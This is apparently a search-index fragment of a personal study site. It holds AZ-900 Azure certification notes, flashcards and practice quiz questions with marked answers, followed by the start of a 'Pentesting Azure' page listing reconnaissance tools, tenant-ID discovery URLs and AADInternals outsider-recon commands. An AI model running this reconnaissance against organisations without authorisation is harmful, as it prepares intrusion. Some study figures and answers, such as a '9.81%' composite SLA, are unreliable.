paid subscriptions.</li> <li>Pay-as-you-go: typical consumption cloud model.</li> <li>Member offers: Some products or services provide credits toward Azure Services.</li> </ul> <p>Subscriptions don't enable you to access Azure service per se. For that matter, you need to purchase service through:</p> <ul> <li>Enterprise agreement.</li> <li>Web Direct.</li> <li>Cloud Solution Provider (or CSP).</li> </ul> <p>If you want to raise the limit or quota above the default limit, \"open an online customer support request at no charge\".   (Correct)</p> <p>Billing zone: Geographical grouping of Azure regions for billing Azure resources. </p> <p>Tools:  Azure Advisor</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#service-level-agreements","title":"Service Level Agreements","text":"<p>A Service Level Agreement (SLA) is an agreement between a service provider and a consumer that generally guarantees that the SLA-backed service will be available for a specific period during the month. 99% SLA  -&gt; 07.20 hours 99.90% SLA  -&gt; 00 hours 43.20 minutes 99.95% SLA  -&gt; 00 hours 21.60 minutes 99.99% SLA  -&gt; 00 hours 04.32 minutes 99.999% SLA -&gt;00 hours 00.00 minutes 25.9 seconds</p> <p>A key point: If an Azure service is available but with degraded performance, it still meets the SLA. The service must be completely unavailable to fail the SLA and qualify for a service credit. </p> <p>In addition to having different SLA, each Azure resource has also their service credits. Generally, the higher the SLA, the lower the service credit will be.</p> <p>SIE is the acronym for Service Impacting Event.</p> <p>Composite SLA is the SLA that results from combining services with potentially different SLAs. To determine the composite SLA, you simply multiply the SLA values for each resource. </p> <p></p> <p>Tip for the exam: Deploying instances of a VM across two or more availability zones raises the SLA for the VM from a 99.9% to 99.99% while launching 2 VM instances with a load balancer gives a composite SLA of 9.81%. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#service-lifecycle-in-azure","title":"Service Lifecycle in Azure","text":"<p>Previews allows you to test a pre-release version of your service. Previews have their own terms and conditions. Some of them don't even have customer support at all. Even though you may see a service on a preview, that doesn't mean that is ready for a production environment.</p> <ul> <li>Private Preview: Azure feature available to ** certain Azure customers**  for evaluation purposes.</li> <li>Public Preview: Azure feature available to all Azure customers  for evaluation purposes. Accessible from the Azure Portal. </li> </ul> <p>Access to preview features at the Azure Portal Preview</p> <p>General availability means that the service, application, or feature is available for all Azure customers. In modern lifecycle</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#cost-management","title":"Cost Management","text":"<p>Three cloud pricing models:</p> <ul> <li>Pay-as-you-go: Suitable for development, testing, short-terms projects, businesses that prefer OpEx over CapExp.</li> <li>Reserved instances: commit to a specific VM type and size for a fixed term (1 or 3 years) in exchange for discounted pricing. Suitable for logn-term projects  with predictable resource requirements, and businesses looking to optimize costs. Prepaying, cost savings can be significant, up to 70% or more. Reservations do not automatically renew, however and pricing reverts to pay-as-you-go when reservation term expires.</li> <li>Spot pricing: Take advantage of unused Azure capacity at a significant discount. Azure can terminate spot instances at any time. Cost-effective, but no guarantees. Suitable for batch processing, data analysis, and non-critical dev and testing, which are cost-sensitive, but interruptible tasks. </li> <li>Azure Hybrid Benefit: For those who have perpetual licenses of a service and want to move their services to Azure, Azure Hybrid Benefit enables them to repurpose these licenses and gain a corresponding costs savings. BUT it's specific to Windows Server and SQL server, not to all Microsoft licenses that your organization owns.</li> </ul> <p>The OpEx cost can be impacted by many factors: </p> <ul> <li>Resource type: When you provision an Azure resource, Azure creates metered instances for that resource. The meters track the resources' usage and generate a usage record that is used to calculate your bill. Meters: Azure creates automatically usage meters when you deploy a resource, so you can track service usage. Usage captured by each usage meter results in a certain number of billable units, and those billable units are converted to charges based on resource types. One billable unit for a particular service will be different in value from the value of a billable unit for another service.</li> <li>Uptime.</li> <li>Consumption: Pay-as-you-go payment model where you pay for the resources that you use during a billing cycle. Azure also offers the ability to commit to using a set amount of cloud resources. When you reserve capacity, you\u2019re committing to using and paying for a certain amount of Azure resources during a given period (typically one or three years).</li> <li>Geography or resource allocation: The cost of power, labor, taxes, and fees vary depending on the location. Due to these variations, Azure resources can differ in costs to deploy depending on the region. </li> <li>Network Traffic: Bandwidth refers to data moving in and out of Azure datacenters. Some inbound data transfers (data going into Azure datacenters) are free. For outbound data transfers (data leaving Azure datacenters), data transfer pricing is based on zones.</li> <li>Subscription type: Some Azure subscription types also include usage allowances, which affect costs.</li> <li>Azure Marketplace: Azure Marketplace lets you purchase Azure-based solutions and services from third-party vendors. Try to avoid recurring costs associated with an offering from a third provider at Azure Marketplace.</li> </ul> <p>Additionally it's necessary paying attention to small details such as, for example, every time you provision a VM, additional resources such as storage and networking are also provisioned. If you deprovision the VM, those additional resources may not deprovision at the same time, either intentionally or unintentionally. Maintenance is needed in order adjust cost.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#pricing-calculator","title":"Pricing calculator","text":"<p>This service helps you out to choose the best Azure resource for your needs given a budget. With the pricing calculator, you can estimate the cost of any provisioned resources, including compute, storage, and associated network costs. You can even account for different storage options like storage type, access tier, and redundancy.</p> <p>https://azure.microsoft.com/en-us/pricing/calculator/</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#tco-calculator","title":"TCO calculator","text":"<p>Total Cost of Ownership Calculator (TCO calculator) helps you compare the costs for running an on-premises infrastructure compared to an Azure Cloud infrastructure. With the TCO calculator, you enter your current infrastructure configuration, including servers, databases, storage, and outbound network traffic. The TCO calculator then compares the anticipated costs for your current environment with an Azure environment supporting the same infrastructure requirements.</p> <p>https://azure.microsoft.com/en-us/pricing/tco/calculator/</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#microsoft-cost-management-tool-or-azure-cost-management-billing","title":"Microsoft Cost Management tool - or Azure Cost Management + Billing","text":"<p>If you accidentally provision new resources, you may not be aware of them until it\u2019s time for your invoice. Cost Management is a service that helps avoid those situations. Cost Management provides the ability to quickly check Azure resource costs, create alerts based on resource spend, and create budgets that can be used to automate management of resources.</p> <p>Two key words so far: alerts and budges.</p> <p>Cost analysis is a subset of Cost Management that provides a quick visual for your Azure costs. Using cost analysis, you can quickly view the total cost in a variety of different ways, including by billing cycle, region, resource, and so on. A budget is where you set a spending limit for Azure. </p> <p>Budgets:  You can set budgets based on a subscription, resource group, service type, or other criteria. When you set a budget, you will also set a budget alert. </p> <p>Cost alerts provide a single location to quickly check on all of the different alert types that may show up in the Cost Management service.  The three types of alerts that may show up are:</p> <ul> <li>Budget alerts: Budget alerts support both cost-based and usage-based budgets (Budgets are defined by cost or by consumption usage when using the Azure Consumption API).</li> <li>Credit alerts: Credit alerts are generated automatically at 90% and at 100% of your Azure credit balance. Whenever an alert is generated, it's reflected in cost alerts, and in the email sent to the account owners.</li> <li>Department spending quota alerts: Department spending quota alerts notify you when department spending reaches a fixed threshold of the quota.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#flashcard-questions","title":"Flashcard questions","text":"<p>What is Cloud computing?</p> <p>The delivery of computing services, such as servers, storage, databases, and networking, over the Internet to provide faster innovation, flexible resources, and economies of scale.</p> <p>How does cloud computing lower operating costs?</p> <p>By only paying for the cloud services used, rather than the capital expense of buying hardware and setting up on-site datacenters.</p> <p>Why do organizations move to the cloud?</p> <p>For cost savings, improved speed and scalability, increased productivity, better performance, reliability, and improved security.</p> <p>What is the advantage of cloud computing's self-service and on-demand nature?</p> <p>It allows for vast amounts of computing resources to be provisioned quickly, giving businesses a lot of flexibility and taking the pressure off capacity planning.</p> <p>What does \"elastically scaling\" mean in cloud computing?</p> <p>Delivering the right amount of IT resources, such as computing power and storage, at the right time and from the right location.</p> <p>How does cloud computing improve productivity?</p> <p>By removing the need for time-consuming IT management tasks, allowing IT teams to focus on more important business goals.</p> <p>How does cloud computing improve performance?</p> <p>By running on a worldwide network of secure datacenters that are regularly upgraded to the latest generation of efficient computing hardware, reducing network latency and offering greater economies of scale.</p> <p>How does cloud computing improve reliability?</p> <p>By making data backup, disaster recovery, and business continuity easier and less expensive through data mirroring at multiple redundant sites on the cloud provider's network.</p> <p>How does cloud computing improve security?</p> <p>By offering a broad set of policies, technologies, and controls that strengthen the overall security posture, protecting data, apps, and infrastructure from potential threats.</p> <p>What is the main advantage of using cloud computing?</p> <p>Cost savings, improved speed and scalability, increased productivity, better performance, reliability, and improved security.</p> <p>What is the biggest difference between cloud computing and traditional IT resources?</p> <p>Traditional IT resources required buying hardware and software, setting up and running on-site datacenters, and paying for electricity and IT experts. Cloud computing eliminates these expenses and provides flexible and on-demand resources.</p> <p>What are the benefits of cloud computing services?</p> <p>Faster innovation, flexible resources, and economies of scale.</p> <p>What is the advantage of cloud computing over traditional on-site datacenters?</p> <p>Cloud computing eliminates the need for hardware setup, software patching, and other time-consuming IT management tasks, allowing IT teams to focus on more important business goals.</p> <p>What is the advantage of cloud computing over a single corporate datacenter?</p> <p>Reduced network latency for applications and greater economies of scale.</p> <p>What is the main advantage of data backup, disaster recovery, and business continuity in cloud computing?</p> <p>It is easier and less expensive.</p> <p>What is the main advantage of security in cloud computing?</p> <p>Cloud providers offer a broad set of policies, technologies, and controls that strengthen the overall security posture.</p> <p>What is the shared responsibility model in cloud computing?</p> <p>The shared responsibility model in cloud computing refers to the division of responsibilities between the cloud provider and the customer in terms of security tasks and workloads.</p> <p>What are the different types of cloud deployment?</p> <p>The different types of cloud deployment are Software as a Service (SaaS), Platform as a Service (PaaS), Infrastructure as a Service (IaaS), and on-premises datacenter.</p> <p>In which type of deployment do customers retain the most responsibilities?</p> <p>In an on-premises datacenter, customers retain the most responsibilities, as they own the entire stack.</p> <p>What responsibilities are always retained by the customer, regardless of the type of deployment?</p> <p>The responsibilities retained by the customer regardless of the type of deployment are data, endpoints, account, and access management.</p> <p>In a SaaS deployment, which party is responsible for protecting the security of the data?</p> <p>In a SaaS deployment, the customer is responsible for protecting the security of the data.</p> <p>In a PaaS deployment, who is responsible for managing and maintaining the underlying infrastructure?</p> <p>In a PaaS deployment, the cloud provider is responsible for managing and maintaining the underlying infrastructure.</p> <p>In an IaaS deployment, who is responsible for managing and maintaining the operating systems and middleware?</p> <p>In an IaaS deployment, the customer is responsible for managing and maintaining the operating systems and middleware.</p> <p>What are the three broad categories of cloud computing services?</p> <p>Infrastructure as a Service (IaaS), Platform as a Service (PaaS), and Software as a Service (SaaS)</p> <p>What are the benefits of migrating your organization's infrastructure to an IaaS solution?</p> <p>Migrating to IaaS helps reduce maintenance of on-premises data centers, save money on hardware costs, and gain real-time business insights. It also gives you the flexibility to scale IT resources up and down with demand and quickly provision new applications.</p> <p>Is lift-and-shift migration a common business scenario for using IaaS?</p> <p>Yes. Lift-and-shift migration is a common business scenario for using IaaS. It is the fastest and least expensive method of migrating an application or workload to the cloud.</p> <p>What is PaaS and how does it differ from IaaS?</p> <p>Platform as a service (PaaS) is a complete development and deployment environment in the cloud, with resources that enable you to deliver everything from simple cloud-based apps to sophisticated, cloud-enabled enterprise applications. PaaS includes infrastructure such as servers, storage, and networking, but also middleware, development tools, business intelligence services, and more. IaaS only includes infrastructure resources.</p> <p>How does PaaS differ from SaaS?</p> <p>PaaS provides a complete development and deployment environment in the cloud, including infrastructure, middleware, development tools, and more. SaaS is a type of cloud service where users access software applications over the internet, without the need for installation or maintenance.</p> <p>** How does SaaS work?**</p> <p>With SaaS, users connect to the software over the Internet, usually with a web browser. The service provider manages the hardware and software, and with the appropriate service agreement, will ensure the availability and the security of the app and your data.</p> <p>What are some common examples of SaaS?</p> <p>Common examples of SaaS are email, calendaring, and office tools (such as Microsoft Office 365).</p> <p>What are the components of SaaS?</p> <p>The components of SaaS include hosted applications/apps, development tools, database management, business analytics, operating systems, servers and storage, networking firewalls/security, and data center physical plant/building.</p> <p>** What are the benefits of using SaaS for an organization?**</p> <p>SaaS provides a complete software solution that you purchase on a pay-as-you-go basis from a cloud service provider. It allows your organization to get quickly up and running with an app at minimal upfront cost.</p> <p>What is a region in Azure?</p> <p>A region in Azure is a geographical area on the planet that contains at least one but potentially multiple datacenters that are nearby and networked together with a low-latency network.</p> <p>Why are regions important in Azure?</p> <p>Regions are important in Azure because they provide flexibility to bring applications closer to users no matter where they are, global regions provide better scalability and redundancy, and they preserve data residency for services.</p> <p>What are some examples of special Azure regions?</p> <p>Examples of special Azure regions include US DoD Central, US Gov Virginia, US Gov Iowa, China East, and China North.</p> <p>What are availability zones in Azure?</p> <p>Availability zones in Azure are created by using one or more datacenters, and there is a minimum of three zones available within a single region.</p> <p>What are region pairs in Azure?</p> <p>Each Azure region is paired with another region within the same geography (such as US, Europe, or Asia) at least 300 miles away. This allows for the replication of resources across a geography and helps reduce the likelihood of interruptions because of events such as natural disasters, civil unrest, power outages, or physical network outages that affect both regions at once.</p> <p>What are the advantages of region pairs in Azure?</p> <p>Region pairs in Azure include automatic geo-redundant storage and prioritization of one region out of every pair in the event of an extensive Azure outage. Planned Azure updates are rolled out to paired regions one region at a time to minimize downtime and risk of application outage.</p> <p>What is the purpose of region pairs in Azure?</p> <p>The purpose of region pairs in Azure is to provide reliable services and data redundancy by replicating resources across a geography and reducing the likelihood of interruptions because of events such as natural disasters, civil unrest, power outages, or physical network outages that affect both regions at once.</p> <p>What happens if a region in a region pair is affected by a natural disaster in Azure?</p> <p>If a region in a region pair is affected by a natural disaster in Azure, services will automatically failover to the other region in its region pair.</p> <p>How does Azure provide a high guarantee of availability?</p> <p>Azure provides a high guarantee of availability by having a broadly distributed set of datacenters, creating region pairs that are directly connected and far enough apart to be isolated from regional disasters, and offering automatic geo-redundant storage and failover capabilities.</p> <p>What is the difference between regions, geographies, and availability zones in Azure?</p> <p>In Azure, regions are geographical areas on the planet that contain at least one but potentially multiple datacenters that are nearby and networked together with a low-latency network. Geographies refer to the larger geographical area that a region is located in, such as US, Europe, or Asia. Availability zones are created by using one or more datacenters and there is a minimum of three zones within a single region.</p> <p>What is an availability zone?</p> <p>Availability zones are physically separate datacenters within an Azure region that are equipped with independent power, cooling, and networking, and are connected through high-speed, private fiber-optic networks.</p> <p>What is the purpose of availability zones?</p> <p>The purpose of availability zones is to provide high availability for mission-critical applications by creating duplicate hardware environments, in case one goes down.</p> <p>How are availability zones connected?</p> <p>Availability zones are connected through high-speed, private fiber-optic networks.</p> <p>What types of Azure services support availability zones?</p> <p>VMs, managed disks, load balancers, and SQL databases support availability zones.</p> <p>What are zonal services?</p> <p>Zonal services are resources that are pinned to a specific zone, such as VMs, managed disks, and IP addresses.</p> <p>What are zone-redundant services?</p> <p>Zone-redundant services are services that the platform replicates automatically across zones, such as zone-redundant storage and SQL Database.</p> <p>What are non-regional services?</p> <p>Non-regional services are services that are always available from Azure geographies and are resilient to zone-wide outages as well as region-wide outages.</p> <p>What is a resource in Azure?</p> <p>A manageable item that's available through Azure. Virtual machines (VMs), storage accounts, web apps, databases, and virtual networks are examples of resources.</p> <p>What is a resource group in Azure?</p> <p>A container that holds related resources for an Azure solution. The resource group includes resources that you want to manage as a group.</p> <p>What is the purpose of a resource group in Azure?</p> <p>The purpose of a resource group is to help manage and organize Azure resources by placing resources of similar usage, type, or location in a resource group.</p> <p>Can a resource belong to multiple resource groups in Azure?</p> <p>No, a resource can only be a member of a single resource group.</p> <p>Can resource groups be nested in Azure?</p> <p>No, resource groups can't be nested.</p> <p>What happens when a resource group is deleted in Azure?</p> <p>When a resource group is deleted, all resources contained within it are also deleted.</p> <p>How can resource groups be used for authorization in Azure?</p> <p>Resource groups are also a scope for applying role-based access control (RBAC) permissions. By applying RBAC permissions to a resource group, you can ease administration and limit access to allow only what's needed.</p> <p>What is the relationship between resources and resource groups in Azure?</p> <p>All resources must be in a resource group, and a resource can only be a member of a single resource group.</p> <p>What is an Azure subscription?</p> <p>An Azure subscription is a logical unit of Azure services that links to an Azure account, which is an identity in Azure Active Directory (Azure AD) or in a directory that Azure AD trusts. It provides authenticated and authorized access to Azure products and services and allows you to provision resources.</p> <p>What are the two types of subscription boundaries in Azure?</p> <p>The two types of subscription boundaries in Azure are Billing boundary and Access control boundary.</p> <p>What happens when you delete a subscription in Azure?</p> <p>When you delete a subscription in Azure, all resources contained within it are also deleted.</p> <p>What is the purpose of creating a billing profile in Azure?</p> <p>The purpose of creating a billing profile in Azure is to have its own monthly invoice and payment method.</p> <p>How can you manage costs in Azure?</p> <p>You can manage costs in Azure by creating multiple subscriptions for different types of billing requirements, and Azure generates separate billing reports and invoices for each subscription so that you can organize and manage costs.</p> <p>What is the purpose of resource access control in Azure?</p> <p>The purpose of resource access control in Azure is to manage and control access to the resources that users provision within each subscription.</p> <p>What is the purpose of an Azure management group? Azure management groups provide a level of scope above subscriptions for efficiently managing access, policies, and compliance for those subscriptions.</p> <p>How do management groups affect subscriptions?</p> <p>All subscriptions within a management group automatically inherit the conditions applied to the management group.</p> <p>Can all subscriptions within a single management group trust different Azure AD tenants?</p> <p>No, all subscriptions within a single management group must trust the same Azure AD tenant.</p> <p>How can management groups be used for governance?</p> <p>You can apply policies to a management group that limit the regions available for VM creation, for example, which would be applied to all management groups, subscriptions, and resources under that management group.</p> <p>How can management groups be used to provide user access to multiple subscriptions?</p> <p>By moving multiple subscriptions under that management group, you can create one role-based access control (RBAC) assignment on the management group, which will inherit that access to all the subscriptions.</p> <p>How many management groups can be supported in a single directory?</p> <p>10,000 management groups can be supported in a single directory.</p> <p>How many levels of depth can a management group tree support?</p> <p>A management group tree can support up to six levels of depth, not including the root level or the subscription level.</p> <p>Can each management group and subscription have multiple parents?</p> <p>No, each management group and subscription can support only one parent.</p> <p>Is each management group and subscription within a single hierarchy in each directory?</p> <p>Yes, all subscriptions and management groups are within a single hierarchy in each directory.</p> If you want to Use this Provision Linux and Windows virtual machines in seconds with the configurations of your choice Virtual Machines Achieve high availability by autoscaling to create thousands of VMs in minutes Virtual Machine Scale Sets Get deep discounts when you provision unused compute capacity to run your workloads Azure Spot Virtual Machines Deploy and scale containers on managed Kubernetes Azure Kubernetes Service (AKS) Accelerate app development using an event-driven, serverless architecture Azure Functions Develop microservices and orchestrate containers on Windows and Linux Azure Service Fabric Quickly create cloud apps for web and mobile with fully managed platform App Service Containerize apps and easily run containers with a single command Azure Container Instances Cloud-scale job scheduling and compute management with the ability to scale to tens, hundreds, or thousands of virtual machines Batch Create highly available, scalable cloud applications and APIs that help you focus on apps instead of hardware Cloud Services Deploy your Azure virtual machines on a physical server only used by your organization Azure Dedicated Host <p>What is the key difference between vertical scaling and horizontal scaling?</p> <ul> <li>Vertical scaling adds more processing power, while horizontal scaling increases storage capacity.  (Incorrect)  </li> <li>Vertical scaling adjusts the number of resources, while horizontal scaling adjusts capabilities. (Correct)</li> </ul> <p>You are an IT manager and want to ensure that you are notified when the Azure spending reaches a certain threshold. Which feature of Azure Cost Management should you use?</p> <ul> <li>Budgets  (Correct)</li> <li>Cost alerts  (Incorrect)</li> </ul> <p>Which of the following tools is NOT available within the Azure Security Center for vulnerability management?</p> <ul> <li>Azure Defender  (Incorrect)</li> <li>Azure Policy  (Incorrect)</li> <li>Azure Advisor  (Incorrect)   </li> <li>Azure Firewall Manager  (Correct)</li> </ul> <p>Your company makes use of several SQL\u00a0databases. However, you want to increase their efficiency because of varying and unpredictable workloads. Which of the following can help you with this?</p> <ul> <li>Resource Tags     (Incorrect)</li> <li>Elastic Pools  (Correct)</li> <li>Region Pairs     (Incorrect)    </li> <li>Scale Sets    (Incorrect)</li> </ul> <p>Just like Azure VM\u00a0Scale Sets are used with VMs, you can use\u00a0Elastic Pools\u00a0with Azure SQL\u00a0Databases!</p> <p>SQL Database elastic pools\u00a0are a simple, cost-effective solution for managing and scaling multiple databases that have varying and unpredictable usage demands. The databases in an elastic pool are on a single Azure SQL Database server and share a set number of resources at a set price. Elastic pools in Azure SQL Database enable SaaS developers to optimize the price performance for a group of databases within a prescribed budget while delivering performance elasticity for each database.</p> <p>Which of the following alert types are available in the Cost Management service? (Select all that apply)</p> <ul> <li>Resource usage alerts  (Incorrect)</li> <li>Budget alerts  (Correct)</li> <li>Department spending quota alerts   (Correct)  </li> <li>Credit alerts   (Correct)</li> </ul> <p>Azure Site Recovery can only be used to replicate and recover virtual machines within Azure.</p> <p>YES / NO</p> <p>The answer is No. Azure Site Recovery can be used to replicate and recover virtual machines not only within Azure, but also from on-premises datacenters to Azure, and between different datacenters or regions. Azure Site Recovery is a disaster recovery solution that provides continuous replication of virtual machines and physical servers to a secondary site, allowing for rapid recovery in case of a disaster. It supports a wide range of scenarios, including replication from VMware, Hyper-V, and physical servers to Azure, as well as replication between Azure regions or datacenters.</p> <p>The ability to provision and deprovision cloud resources quickly, with minimal management effort, is known as _.</p> <ul> <li>Sustainability     (Incorrect)</li> <li>Scalability  (Correct)</li> <li>Elasticity    (Incorrect)</li> <li>Resiliency    (Incorrect)</li> </ul> <p>The correct answer is Scalability. It specifically refers to the ability to provision and deprovision cloud resources quickly and with minimal management effort.</p> <ul> <li>Resiliency:\u00a0It refers to the ability of a system to recover quickly from failures or disruptions. While resiliency is an important attribute of cloud systems, it is not specifically related to the ability to provision and deprovision resources quickly.</li> <li>Elasticity:\u00a0It is the ability of a system to scale up or down in response to changes in demand. This is a closely related concept to scalability, but specifically refers to the ability to handle changes in workload or traffic.  </li> <li>Sustainability:\u00a0It refers to the ability of a system to operate in an environmentally friendly manner, with minimal impact on the planet. While sustainability is an important consideration for cloud providers, it is not specifically related to the ability to provision and deprovision resources quickly.</li> </ul> <p>It's possible to deploy an Azure VM\u00a0from a MacOS based system by using which of the following options?</p> <ul> <li>Azure Powershell (Correct)</li> <li>Azure Cloudshell (Correct)</li> <li>Azure Portal (Correct)</li> <li>Azure CLI  (Correct)</li> </ul> <p>Which of the following can be included as artifacts in an Azure Blueprint? (Select all that apply)</p> <ul> <li>Policy assignments   (Correct)</li> <li>Azure Resource Manager templates  (Correct)</li> <li>Role assignments  (Correct)</li> <li>Resource groups  (Correct)</li> </ul> <p>Azure Service Health allows us to define the critical resources that should never be impacted due to outages and downtimes.</p> <p>YES / NO</p> <p>No. Azure Service Health notifies you about Azure service incidents and planned maintenance. Although you can see when a maintenance is planned and act accordingly to migrate a VM if needed, you can't prevent service failures.</p> <p>It's possible to deploy a new Azure VM\u00a0from a Google Chromebook by using PowerAutomate.</p> <p>YES / NO </p> <p>No. Tricky question! PowerAutomate is not the same as PowerShell.</p> <p>Which of the following services can help you:</p> <ul> <li>Assign\u00a0time-bound\u00a0access to resources using start and end dates  (Incorrect)</li> <li>Enforce\u00a0multi-factor authentication\u00a0to activate any role  (Incorrect)</li> <li>Azure Privileged Identity Management (Correct)</li> <li>Azure DDos Protection  (Incorrect)</li> <li>Azure Security Center (Incorrect)</li> <li>Azure Advanced Threat Protection (ATP)  (Incorrect)</li> </ul> <p>Azure Active Directory (Azure AD)\u00a0Privileged Identity Management (PIM) is a service that enables you to manage, control, and monitor access to important resources in your organization. These resources include resources in Azure AD, Azure, and other Microsoft Online Services like Office 365 or Microsoft Intune.</p> <p>Which of the following actions can help you reduce your Azure costs?</p> <ul> <li>Enabling automatic scaling for all virtual machines   (Incorrect)</li> <li>Increasing the number of virtual machines deployed  (Incorrect)</li> <li>Reducing the amount of data transferred between Azure regions (Correct)</li> <li>Keeping all virtual machines running 24/7  (Incorrect)</li> </ul> <p>Reducing the amount of data transferred between Azure regions can help reduce costs by minimizing data egress charges.</p> <p>In the defense-in-depth model, what is the role of the \"network\" layer?</p> <ul> <li>It secures access to virtual machines. (Incorrect)</li> <li>It ensures the physical security of computing hardware. (Incorrect)</li> <li>It limits communication between resources and enforces access controls. (Correct)</li> <li>It focuses on securing access to applications. (Incorrect)</li> </ul> <p>The \"network\" layer in the defense-in-depth model is responsible for limiting communication between resources, which helps prevent the spread of attacks. It enforces access controls to ensure that only necessary communication occurs and reduces the risk of an attack affecting other systems.</p> <p>You want to restrict access to certain Azure resources based on departmental requirements within your organization. Which Azure feature would you use?</p> <ul> <li>Resource groups (Incorrect)</li> <li>Subscriptions    (Correct)</li> <li>Azure Active Directory (Incorrect)</li> <li>Management groups (Incorrect)</li> </ul> <p>In this scenario, you would use\u00a0subscriptions\u00a0to restrict access to certain Azure resources based on departmental requirements. Subscriptions can be used to apply different access-management policies, reflecting different organizational structures. Azure applies access-management policies at the subscription level, which allows you to manage and control access to the resources that users provision within specific subscriptions.</p> <p>Which of the following affect costs in Azure? (Choose 2)</p> <ul> <li>Availability Zone  (Incorrect)</li> <li>Instance size (Correct)</li> <li>Location (Correct) </li> <li>Knowledge center usage (Incorrect) </li> </ul> <p>The instance size and the location (eg -US or Europe etc ) affect the prices. The knowledge center is completely free to use, and you aren't charged for an Availability Zone.</p> <p>Which of the following can be used to manage your Azure Resources from an iPhone?</p> <ul> <li>Azure Portal (Correct)</li> <li>Windows PowerShell (Incorrect) </li> <li>Azure Cloud Shell (Correct)</li> <li>Azure CLI  (Incorrect) </li> <li>Azure Mobile App (Correct)</li> </ul> <p>Azure CLI can be installed on MacOS but it cannot be installed on an iPhone. Windows PowerShell can be installed on MacOS but it cannot be installed on an iPhone.</p> <p>It is possible to deploy Azure resources through a Tablet by using Bash in the Azure Cloud Shell.</p> <p>No / Yes</p> <p>yes. Azure Cloud Shell is an interactive, authenticated,\u00a0browser-accessible (the key to everything since all you need is a browser and the OS\u00a0doesn't matter)\u00a0shell for managing Azure resources. It provides the flexibility of choosing the shell experience that best suits the way you work,\u00a0either Bash or PowerShell.</p> <p>Which of the following services allows you to send events generated from Azure resources to applications?</p> <ul> <li>Azure Event Hub  (Incorrect)</li> <li>Azure Event Grid  (Correct)</li> <li>Azure Cognitive Services  (Incorrect)</li> <li>Azure App Service (Incorrect)</li> </ul> <p>What Azure service provides recommendations to optimize your cloud spending based on your usage patterns?</p> <ul> <li>Azure Monitor  (Incorrect)</li> <li>Azure Cost Management and Billing  (Correct)</li> <li>Azure Policy  (Incorrect)</li> <li>Azure Advisor   (Incorrect)</li> </ul> <p>Azure Cost Management and Billing\u00a0is the correct answer &amp;\u00a0provides recommendations to optimize your cloud spending based on your usage patterns. The service provides insights and cost management tools to help you monitor, allocate, and optimize your cloud costs.</p> <p>Which of the following services allows you to send events generated from Azure resources to applications?</p> <ul> <li>Azure Event Hub</li> <li>Azure Event Grid</li> <li>Azure Cognitive Services</li> <li>Azure App Service</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/pentesting-azure/","title":"Pentesting Azure","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#reconnaissance","title":"Reconnaissance","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#network-discovery","title":"Network discovery","text":"<ul> <li>Nmap</li> <li>Masscan</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#dns-reconnaissance","title":"DNS reconnaissance","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#dns-reconnaissance_1","title":"DNS reconnaissance","text":"<ul> <li>GitHub - aboul3la/Sublist3r: Fast subdomains enumeration tool for penetration testers </li> <li>GitHub - rbsec/dnscan </li> <li>nslookup, host, dig</li> <li>GitHub - darkoperator/dnsrecon: DNS Enumeration Script </li> <li>GitHub - lanmaster53/recon-ng: Open Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources. </li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#certificate-transparency","title":"Certificate transparency","text":"<ul> <li>crt.sh | Certificate Search</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#miscellaneous","title":"Miscellaneous","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#shodan","title":"Shodan","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#eyewitness","title":"Eyewitness","text":"<p>GitHub - FortyNorthSecurity/EyeWitness: EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.</p>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#azure-discovery","title":"Azure Discovery","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#finding-tenantid","title":"Finding tenantID","text":"<ul> <li>https://enterpriseregistration.windows.net/company.com/enrollmentserver/contract?api-version=1.4</li> <li> <p>https://login.microsoftonline.com/getuserrealm.srf?login=username@company.com&amp;xml=1 </p> </li> <li> <p>AADInternals</p> </li> <li>Invoke-AADIntReconAsOutsider -DomainName company.com     </li> <li>Get-AADIntTenantDomains -Domain company.com  </li> <li>Invoke-AADIntReconAsOutsider -DomainName company.com</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#azure-ip-ranges","title":"Azure IP ranges","text":"<p>Download Azure IP Ranges and Service Tags \u2013 Public Cloud from Official Microsoft Download Center</p>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#openid-configuration-document","title":"OpenID configuration document","text":"<ul> <li>https://login.microsoftonline.com/\\/v2.0/.well-known/openid-configuration","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#scrape-azure-resources","title":"Scrape Azure Resources","text":"<p>GitHub - lutzenfried/CloudScraper: CloudScraper: Tool to enumerate targets in search of cloud resources. S3 Buckets, Azure Blobs, Digital Ocean Storage Space.</p>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#google-dorks","title":"Google Dorks","text":"<ul> <li>Reveal the Cloud with Google Dorks | by Mike Takahashi | Feb, 2023 | InfoSec Write-ups (infosecwriteups.com)</li> <li>Useful Google Dorks for Open Source Intelligence Investigations - Maltego</li> 